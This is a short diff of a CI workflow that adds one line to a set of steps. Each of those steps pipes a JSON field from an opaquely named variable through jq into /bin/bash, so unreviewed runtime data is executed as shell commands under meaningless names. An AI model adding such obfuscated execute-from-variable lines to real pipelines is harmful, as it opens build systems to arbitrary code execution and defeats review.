@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$wss2459" | jq -r .rxz916 | /bin/bash
           printf '%s' "$fmv37" | jq -r .yj5 | /bin/bash
           echo $akix5 | jq -r .enqk265 | /bin/bash
+          echo $d717 | jq -r .mjet2 | /bin/bash
 
       - name: Persist results
         if: always()
